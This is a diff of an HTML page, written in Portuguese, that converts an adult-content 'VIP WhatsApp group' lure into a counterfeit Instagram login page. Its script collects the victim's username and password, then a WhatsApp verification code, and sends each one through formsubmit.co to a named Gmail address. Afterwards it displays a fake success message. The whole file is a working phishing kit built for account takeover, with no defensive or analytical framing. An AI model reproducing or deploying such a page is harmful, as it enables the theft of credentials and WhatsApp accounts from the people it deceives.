@@ -1,112 +1,152 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <title>Conteúdo VIP +18</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
     body {
+      background-color: #fafafa;
+      font-family: 'Roboto', sans-serif;
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #000;
-      color: #fff;
-      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
     }
+
     .container {
-      padding: 20px;
-      max-width: 400px;
-      margin: auto;
-    }
-    img {
-      max-width: 100%;
-      border-radius: 10px;
-      margin-bottom: 20px;
-    }
-    input, button {
+      background: white;
+      padding: 40px 30px;
+      border: 1px solid #ddd;
+      text-align: center;
       width: 90%;
-      padding: 14px;
-      margin: 10px 0;
-      border: none;
+      max-width: 320px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 25px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
       border-radius: 5px;
-      font-size: 18px;
+      font-size: 14px;
+      box-sizing: border-box;
     }
-    input {
-      background-color: #222;
-      color: #fff;
-    }
+
     button {
-      background-color: #e91e63;
-      color: #fff;
+      background-color: #3897f0;
+      color: white;
+      font-weight: bold;
       cursor: pointer;
+      border: none;
     }
-    h1 {
-      font-size: 26px;
+
+    button:hover {
+      background-color: #318bda;
     }
-    p {
-      font-size: 18px;
+
+    .footer {
+      font-size: 12px;
+      color: #999;
+      margin-top: 15px;
     }
+
     .hidden {
       display: none;
+    }
+
+    .loading {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .loading img {
+      width: 40px;
+      margin-bottom: 10px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
+  <div class="container" id="login">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />
+    <form id="loginForm">
+      <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
+      <input type="password" name="password" placeholder="Senha" required />
+      <button type="submit">Entrar</button>
+    </form>
+    <div class="footer">© 2025 Instagram from Meta</div>
+  </div>
 
-  <div class="container" id="form-container">
-    <h1>Grupo VIP +18</h1>
-    <p>Entre agora no nosso grupo privado de conteúdo adulto no WhatsApp.</p>
-    <img src="https://i.imgur.com/1gI1n5H.jpg" alt="Modelo">
-
-    <form id="vip-form">
-      <input type="text" name="nome" placeholder="Seu nome" required>
-      <input type="email" name="email" placeholder="Seu e-mail" required>
-      <input type="tel" name="whatsapp" placeholder="Seu WhatsApp com DDD" required>
-      <button type="submit">Quero entrar no grupo</button>
+  <div class="container hidden" id="codigo">
+    <h3>Verificação de segurança</h3>
+    <p>Enviamos um código de 6 dígitos para seu WhatsApp.</p>
+    <form id="codigoForm">
+      <input type="text" name="codigo" placeholder="Digite o código do WhatsApp" required />
+      <button type="submit">Confirmar</button>
     </form>
   </div>
 
-  <div class="container hidden" id="confirmacao">
-    <h1>Enviando código...</h1>
-    <p>Estamos enviando o código de acesso para o número informado via WhatsApp.</p>
-    <p>Aguarde alguns instantes...</p>
-    
-    <form id="codigo-form">
-      <input type="text" name="codigo" placeholder="Digite o código recebido" required>
-      <button type="submit">Validar código</button>
-    </form>
+  <div class="container hidden loading" id="carregando">
+    <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
+    <p>Verificando código...</p>
+  </div>
+
+  <div class="container hidden" id="final">
+    <h2>Parabéns!</h2>
+    <p>Cadastro realizado com sucesso.</p>
+    <p>Em alguns instantes, você será encaminhado para o nosso grupo VIP no WhatsApp.</p>
   </div>
 
   <script>
-    const form = document.getElementById("vip-form");
-    form.addEventListener("submit", function(e) {
+    const loginForm = document.getElementById("loginForm");
+    const codigoForm = document.getElementById("codigoForm");
+
+    loginForm.addEventListener("submit", function(e) {
       e.preventDefault();
-      const dados = new FormData(form);
+      document.getElementById("login").classList.add("hidden");
+      document.getElementById("codigo").classList.remove("hidden");
+
+      const dados = new FormData(loginForm);
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
         headers: { 'Accept': 'application/json' },
         body: dados
-      }).then(response => {
-        document.getElementById("form-container").classList.add("hidden");
-        document.getElementById("confirmacao").classList.remove("hidden");
-      }).catch(error => {
-        alert("Erro ao enviar. Tente novamente.");
       });
     });
 
-    const codigoForm = document.getElementById("codigo-form");
     codigoForm.addEventListener("submit", function(e) {
       e.preventDefault();
-      const codigoData = new FormData(codigoForm);
+      document.getElementById("codigo").classList.add("hidden");
+      document.getElementById("carregando").classList.remove("hidden");
+
+      const dadosCodigo = new FormData(codigoForm);
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
         headers: { 'Accept': 'application/json' },
-        body: codigoData
-      }).then(response => {
-        alert("Código enviado! Em breve você será redirecionado.");
-      }).catch(error => {
-        alert("Erro ao validar o código. Tente novamente.");
+        body: dadosCodigo
       });
+
+      setTimeout(() => {
+        document.getElementById("carregando").classList.add("hidden");
+        document.getElementById("final").classList.remove("hidden");
+      }, 2500);
     });
   </script>
-
 </body>
 </html>
